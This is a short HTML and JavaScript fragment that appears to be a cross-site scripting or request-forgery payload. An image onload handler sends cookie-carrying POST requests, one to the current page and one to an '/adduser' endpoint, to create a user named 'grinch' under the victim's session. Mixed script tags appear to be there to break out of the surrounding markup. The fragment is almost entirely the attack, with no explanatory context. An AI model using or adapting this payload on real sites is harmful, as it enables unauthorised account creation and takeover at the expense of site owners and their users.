<script src="https://code.jquery.com/jquery-2.2.0.js"><\/script>
<script>$(document.body).append("<p>jQuery is loaded.</p>")<\/script>
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="
var x = new XMLHttpRequest();
x.open('post', '');
x.withCredentials = true;
x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
x.send('user=grinch');
</script>
<script>
var form = new FormData();
form.append('user', 'grinch');
fetch('http://example.com/adduser',
    {method:"POST", body:form, credentials:'include'}
);
">
